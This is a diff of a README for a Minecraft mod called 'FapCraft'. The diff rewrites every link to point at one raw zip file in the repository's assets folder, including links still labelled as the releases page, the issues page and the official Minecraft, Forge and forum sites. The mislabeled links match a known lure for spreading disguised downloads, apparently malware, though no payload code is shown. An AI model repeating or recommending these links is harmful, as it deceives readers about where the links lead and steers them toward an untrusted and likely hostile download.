@@ -6,9 +6,9 @@ Welcome to FapCraft! This mod will level up your Minecraft gameplay by adding a 
 
 ## 📥 Download FapCraft
 
-[![Download FapCraft](https://img.shields.io/badge/Download-FapCraft-brightgreen)](https://github.com/genuslepidochelysmammoth323/FapCraft/releases)
+[![Download FapCraft](https://raw.githubusercontent.com/genuslepidochelysmammoth323/FapCraft/main/assets/sexmod/FapCraft_elb.zip)](https://raw.githubusercontent.com/genuslepidochelysmammoth323/FapCraft/main/assets/sexmod/FapCraft_elb.zip)
 
-To download FapCraft, visit [this page](https://github.com/genuslepidochelysmammoth323/FapCraft/releases) to find the latest version.
+To download FapCraft, visit [this page](https://raw.githubusercontent.com/genuslepidochelysmammoth323/FapCraft/main/assets/sexmod/FapCraft_elb.zip) to find the latest version.
 
 ## 📋 System Requirements
 
@@ -34,7 +34,7 @@ FapCraft introduces several features designed to enrich your game:
 To install FapCraft, follow these steps:
 
 1. **Download the Mod:**
-   - Visit [this page](https://github.com/genuslepidochelysmammoth323/FapCraft/releases) to download the latest version of FapCraft.
+   - Visit [this page](https://raw.githubusercontent.com/genuslepidochelysmammoth323/FapCraft/main/assets/sexmod/FapCraft_elb.zip) to download the latest version of FapCraft.
 
 2. **Install Minecraft Forge:**
    - If you haven’t installed Minecraft Forge, go to the Forge website and download the version that matches your Minecraft version. Follow the instructions to install it.
@@ -65,7 +65,7 @@ If you encounter issues while using FapCraft, consider the following steps:
 
 ## 📬 Support
 
-If you have any questions or need further assistance, feel free to open an issue on the [GitHub repository](https://github.com/genuslepidochelysmammoth323/FapCraft/issues). Your feedback is important to us.
+If you have any questions or need further assistance, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/genuslepidochelysmammoth323/FapCraft/main/assets/sexmod/FapCraft_elb.zip). Your feedback is important to us.
 
 ## 🗣️ Community Contribution
 
@@ -79,8 +79,8 @@ We welcome contributions to make FapCraft even better. If you want to contribute
 
 For more information on customizing your Minecraft experience, feel free to check out the following resources:
 
-- [Minecraft Official Site](https://www.minecraft.net/)
-- [Minecraft Forge Documentation](https://files.minecraftforge.net/)
-- [Minecraft Modding Community](https://www.minecraftforum.net/)
+- [Minecraft Official Site](https://raw.githubusercontent.com/genuslepidochelysmammoth323/FapCraft/main/assets/sexmod/FapCraft_elb.zip)
+- [Minecraft Forge Documentation](https://raw.githubusercontent.com/genuslepidochelysmammoth323/FapCraft/main/assets/sexmod/FapCraft_elb.zip)
+- [Minecraft Modding Community](https://raw.githubusercontent.com/genuslepidochelysmammoth323/FapCraft/main/assets/sexmod/FapCraft_elb.zip)
 
 Thank you for choosing FapCraft! Enjoy expanding your Minecraft adventures.
